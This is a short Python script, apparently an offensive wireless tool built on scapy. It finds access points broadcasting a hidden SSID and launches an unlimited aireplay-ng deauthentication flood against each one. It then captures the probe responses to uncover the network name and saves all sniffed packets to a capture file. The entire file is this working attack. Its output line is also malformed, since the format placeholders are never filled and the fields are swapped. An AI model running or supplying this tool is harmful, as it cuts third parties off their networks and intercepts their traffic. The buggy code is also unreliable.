#!/usr/bin/env python

from scapy.all import *

hidden_ssid_aps = set()

def PacketHandler(pkt):
    if pkt.haslayer(Dot11Beacon):
        if not pkt.info :
            if pkt.addr3 not in hidden_ssid_aps:
                hidden_ssid_aps.add(pkt.addr3)
                os.system('aireplay-ng --deauth 0 -a '+pkt.addr3+' wlan0 --ignore-negative-one')

    elif pkt.haslayer(Dot11ProbeResp) and ( pkt.addr3 in hidden_ssid_aps ):
        print("HIDDEN SSID Uncovered! BSSID: %s,ESSID: %s,Channel: %d", str(pkt.info), str(pkt.addr3), pkt.getlayer(Dot11Elt).channel)

pkts = sniff(iface="wlan0", count = 0, prn = PacketHandler)

wrpcap("SSID.cap", pkts)